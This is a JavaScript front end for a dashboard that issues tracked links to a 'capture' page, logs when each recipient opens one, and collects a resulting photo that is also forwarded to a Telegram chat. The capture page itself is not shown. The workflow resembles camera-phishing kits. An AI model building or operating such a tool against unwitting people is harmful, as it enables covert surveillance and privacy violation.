const form = document.querySelector('#createLinkForm');
const note = document.querySelector('#note');
const noteCounter = document.querySelector('#noteCounter');
const tableBody = document.querySelector('#linksTableBody');
const emptyState = document.querySelector('#emptyState');
const statusFilter = document.querySelector('#statusFilter');
const searchInput = document.querySelector('#searchInput');
const resultCount = document.querySelector('#resultCount');
const dialog = document.querySelector('#linkDialog');
const generatedLink = document.querySelector('#generatedLink');
const openGeneratedLink = document.querySelector('#openGeneratedLink');
const photoDialog = document.querySelector('#photoDialog');
const photoDialogImage = document.querySelector('#photoDialogImage');
const openPhotoOriginal = document.querySelector('#openPhotoOriginal');
const toast = document.querySelector('#toast');
const telegramState = document.querySelector('#telegramState');
const telegramStateText = document.querySelector('#telegramStateText');

let records = [];
let toastTimer;

function escapeHtml(value) {
  return String(value).replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;').replaceAll('"', '&quot;').replaceAll("'", '&#039;');
}

function captureUrl(recordToken) {
  const url = new URL('./capture.html', window.location.href);
  url.searchParams.set('token', recordToken);
  return url.href;
}

function statusMeta(status) {
  return {
    created: ['Создана', 'created'], opened: ['Открыта', 'opened'], captured: ['Фото готово', 'captured'],
    revoked: ['Отозвана', 'revoked'], expired: ['Истекла', 'revoked']
  }[status] || ['Создана', 'created'];
}

function formatDate(iso) {
  return new Intl.DateTimeFormat('ru-RU', { day: '2-digit', month: '2-digit', year: '2-digit', hour: '2-digit', minute: '2-digit' }).format(new Date(iso));
}

function filteredRecords() {
  const status = statusFilter.value;
  const query = searchInput.value.trim().toLocaleLowerCase('ru');
  return records.filter((record) => {
    const haystack = `${record.recipient} ${record.note} ${record.group}`.toLocaleLowerCase('ru');
    return (status === 'all' || record.status === status) && (!query || haystack.includes(query));
  });
}

function render() {
  const visible = filteredRecords();
  tableBody.innerHTML = visible.map((record) => {
    const [label, className] = statusMeta(record.status);
    return `<tr>
      <td><span class="badge badge--${className}">${label}</span>${telegramDelivery(record)}</td>
      <td class="recipient-cell"><strong title="${escapeHtml(record.recipient)}">${escapeHtml(record.recipient)}</strong><span>${escapeHtml(record.group)}</span></td>
      <td class="note-cell" title="${escapeHtml(record.note || '—')}">${escapeHtml(record.note || '—')}</td>
      <td>${formatDate(record.createdAt)}</td>
      <td><div class="table-actions">
        ${record.hasPhoto ? `<button class="action-button action-button--photo" data-action="photo" data-token="${record.token}">Фото</button>` : ''}
        <button class="action-button" data-action="copy" data-token="${record.token}">Копировать</button>
        <button class="action-button" data-action="open" data-token="${record.token}">Открыть</button>
        ${!['revoked', 'expired', 'captured'].includes(record.status) ? `<button class="action-button action-button--danger" data-action="revoke" data-token="${record.token}">Отозвать</button>` : ''}
      </div></td>
    </tr>`;
  }).join('');
  emptyState.classList.toggle('is-hidden', visible.length > 0);
  resultCount.textContent = `${visible.length} ${declension(visible.length, ['запись', 'записи', 'записей'])}`;
  document.querySelector('#totalCount').textContent = records.length;
  document.querySelector('#openedCount').textContent = records.filter((item) => ['opened', 'captured'].includes(item.status)).length;
  document.querySelector('#photoCount').textContent = records.filter((item) => item.status === 'captured').length;
}

function telegramDelivery(record) {
  if (!record.hasPhoto || record.telegramStatus === 'not_configured') return '';
  const states = {
    sent: ['Отправлено в Telegram', 'delivery-state--sent', 'TG ✓'],
    failed: ['Ошибка отправки в Telegram', 'delivery-state--failed', 'TG !'],
    pending: ['Отправляется в Telegram', 'delivery-state--pending', 'TG …']
  };
  const [title, className, label] = states[record.telegramStatus] || states.pending;
  return `<span class="delivery-state ${className}" title="${title}">${label}</span>`;
}

function declension(number, words) {
  const mod100 = number % 100;
  const mod10 = number % 10;
  if (mod100 > 10 && mod100 < 20) return words[2];
  if (mod10 > 1 && mod10 < 5) return words[1];
  if (mod10 === 1) return words[0];
  return words[2];
}

function showToast(message) {
  clearTimeout(toastTimer);
  toast.textContent = message;
  toast.classList.add('toast--visible');
  toastTimer = setTimeout(() => toast.classList.remove('toast--visible'), 2400);
}

async function api(path, options = {}) {
  const response = await fetch(path, options);
  const payload = await response.json().catch(() => ({}));
  if (response.status === 401) {
    window.location.replace('/login.html');
    throw new Error('Требуется вход');
  }
  if (!response.ok) throw new Error(payload.error || 'Ошибка соединения с сервером');
  return payload;
}

async function refreshRecords({ quiet = true } = {}) {
  try {
    records = (await api('/api/links')).links;
    render();
  } catch (error) {
    if (!quiet) showToast(error.message);
  }
}

async function refreshTelegramStatus() {
  try {
    const status = await api('/api/telegram/status');
    telegramState.classList.remove('telegram-state--connected', 'telegram-state--error');
    if (!status.configured) {
      telegramStateText.textContent = 'Telegram не подключён';
      telegramState.title = 'Добавьте TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID';
      return;
    }
    if (status.connected) {
      telegramState.classList.add('telegram-state--connected');
      telegramStateText.textContent = status.chatTitle || 'Telegram подключён';
      telegramState.title = status.botUsername ? `@${status.botUsername}` : 'Telegram подключён';
      return;
    }
    telegramState.classList.add('telegram-state--error');
    telegramStateText.textContent = 'Ошибка Telegram';
    telegramState.title = status.error || 'Проверьте токен и ID группы';
  } catch (error) {
    telegramState.classList.add('telegram-state--error');
    telegramStateText.textContent = 'Telegram недоступен';
    telegramState.title = error.message;
  }
}

async function copyText(value) {
  try {
    await navigator.clipboard.writeText(value);
  } catch {
    const input = document.createElement('textarea');
    input.value = value;
    document.body.append(input);
    input.select();
    document.execCommand('copy');
    input.remove();
  }
  showToast('Ссылка скопирована');
}

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  const submitButton = form.querySelector('button[type="submit"]');
  submitButton.disabled = true;
  const data = new FormData(form);
  try {
    const payload = await api('/api/links', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ recipient: data.get('recipient'), note: data.get('note'), group: data.get('group'), expires: data.get('expires') })
    });
    await refreshRecords();
    const url = captureUrl(payload.link.token);
    generatedLink.value = url;
    openGeneratedLink.href = url;
    dialog.showModal();
    form.reset();
    noteCounter.textContent = '0';
  } catch (error) {
    showToast(error.message);
  } finally {
    submitButton.disabled = false;
  }
});

note.addEventListener('input', () => { noteCounter.textContent = note.value.length; });
statusFilter.addEventListener('change', render);
searchInput.addEventListener('input', render);

tableBody.addEventListener('click', async (event) => {
  const button = event.target.closest('[data-action]');
  if (!button) return;
  const record = records.find((item) => item.token === button.dataset.token);
  if (!record) return;
  if (button.dataset.action === 'copy') await copyText(captureUrl(record.token));
  if (button.dataset.action === 'open') window.open(captureUrl(record.token), '_blank', 'noopener');
  if (button.dataset.action === 'photo') {
    photoDialogImage.src = `${record.photoUrl}?v=${encodeURIComponent(record.capturedAt || '')}`;
    openPhotoOriginal.href = record.photoUrl;
    document.querySelector('#photoDialogTitle').textContent = record.recipient;
    photoDialog.showModal();
  }
  if (button.dataset.action === 'revoke') {
    try {
      await api(`/api/links/${record.token}/revoke`, { method: 'POST' });
      await refreshRecords();
      showToast('Ссылка отозвана');
    } catch (error) { showToast(error.message); }
  }
});

document.querySelector('#copyGeneratedLink').addEventListener('click', () => copyText(generatedLink.value));
document.querySelector('.dialog-close').addEventListener('click', () => dialog.close());
document.querySelector('.photo-dialog-close').addEventListener('click', () => photoDialog.close());
[dialog, photoDialog].forEach((modal) => modal.addEventListener('click', (event) => { if (event.target === modal) modal.close(); }));
document.querySelector('#clearDemo').addEventListener('click', async () => {
  if (!records.length || !window.confirm('Очистить весь журнал ссылок?')) return;
  try {
    await api('/api/links', { method: 'DELETE' });
    await refreshRecords();
    showToast('Журнал очищен');
  } catch (error) { showToast(error.message); }
});
document.querySelector('#logoutButton').addEventListener('click', async () => {
  try {
    await fetch('/api/auth/logout', { method: 'POST' });
  } finally {
    window.location.replace('/login.html');
  }
});

document.addEventListener('visibilitychange', () => { if (!document.hidden) refreshRecords(); });
setInterval(() => { if (!document.hidden) refreshRecords(); }, 3000);
refreshRecords({ quiet: false });
refreshTelegramStatus();
setInterval(refreshTelegramStatus, 60000);
